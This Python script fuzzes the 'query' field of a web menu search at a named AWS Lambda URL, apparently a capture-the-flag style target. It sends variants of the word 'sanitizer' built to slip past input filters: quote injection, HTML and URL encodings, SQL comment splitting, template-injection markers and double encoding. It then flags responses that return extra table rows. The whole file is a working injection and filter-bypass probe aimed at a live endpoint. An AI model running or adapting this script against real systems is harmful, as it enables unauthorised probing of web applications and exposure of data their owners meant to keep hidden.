import requests
import time
from urllib.parse import quote

def generate_payloads():
    # Basic sanitizer variations
    sanitizer_words = [
        "sanitizer",
        "sani'tizer",
        "san'itizer",
        "SANITIZER",
        "San'itizer",
        "san\'itizer",
        # HTML encoded
        "san&#x27;itizer",
        "san&apos;itizer",
        # URL encoded base
        "san%27itizer",
        "san%2527itizer",
        # SQL comments
        "san/**/itizer",
        "san%2F%2A%2A%2Fitizer",
        # Combined terms
        "sanitizer burger",
        "special sanitizer",
        "burger sanitizer",
        # Template injection attempts
        "{{sanitizer}}",
        "${sanitizer}",
        "#{sanitizer}",
        # Case variations
        "SaNiTiZeR",
        "SANITIZER",
        "sanitizer",
        # Combinations with spaces
        "san itizer",
        "san  itizer",
        "san   itizer",
        # Numbers and special chars
        "san1tizer",
        "san!tizer",
        "san@tizer",
        # Double encoded
        quote(quote("san'itizer")),
        quote(quote("san/**/itizer")),
    ]
    
    return sanitizer_words

def test_payload(payload):
    url = 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu'
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws',
        'Referer': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }
    
    data = {
        'query': payload
    }
    
    try:
        response = requests.post(url, headers=headers, data=data)
        return response.text, response.status_code
    except Exception as e:
        return str(e), 0

def main():
    payloads = generate_payloads()
    results = []
    
    print(f"Testing {len(payloads)} payloads...")
    
    print("-" * 50)
    
    for i, payload in enumerate(payloads, 1):
        print(f"Testing payload [{i}/{len(payloads)}]: {payload}")
        response_text, status_code = test_payload(payload)
        print(f"Response length: {len(response_text)}")
        # Look for interesting responses
        if 'table' in response_text.lower() and status_code == 200:
            if response_text.count('<tr>') > 3:  # More rows than the default table
                print(f"\n[!] Interesting response found for payload: {payload}")
                print(f"Status Code: {status_code}")
                print(f"Response length: {len(response_text)}")
                print("-" * 50)
                results.append((payload, response_text, status_code))
        
        # Add a small delay to avoid overwhelming the server
        time.sleep(0.5)
    
    # Print summary of interesting findings
    if results:
        print("\nInteresting payloads found:")
        for payload, response, status_code in results:
            print(f"\nPayload: {payload}")
            print(f"Status Code: {status_code}")
            print(f"Response length: {len(response)}")
            # Print a snippet of the response
            print("Response preview:")
            print(response[:200] + "..." if len(response) > 200 else response)
    else:
        print("\nNo interesting responses found.")

if __name__ == "__main__":
    main()